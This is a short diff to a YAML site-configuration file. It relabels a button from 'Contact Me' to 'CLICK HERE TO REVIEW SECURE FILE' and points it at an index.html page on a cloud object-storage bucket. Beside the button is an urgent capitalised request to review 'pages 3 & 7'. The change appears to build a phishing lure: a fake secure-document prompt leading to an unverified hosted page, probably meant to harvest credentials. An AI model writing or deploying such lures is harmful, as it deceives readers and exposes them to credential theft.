@@ -7,7 +7,7 @@ sections:
       NOTE : REVIEW PAGES 3 & 7 CAREFULLY BELOW AND GIVE US YOUR INSIGHT AND
       TAKE ON THE PROJECT
     actions:
-      - label: Contact Me
+      - label: CLICK HERE TO REVIEW SECURE FILE
         url: >-
           https://ibmyl040.s3.ca-tor.cloud-object-storage.appdomain.cloud/unchair/index.html
         style: primary
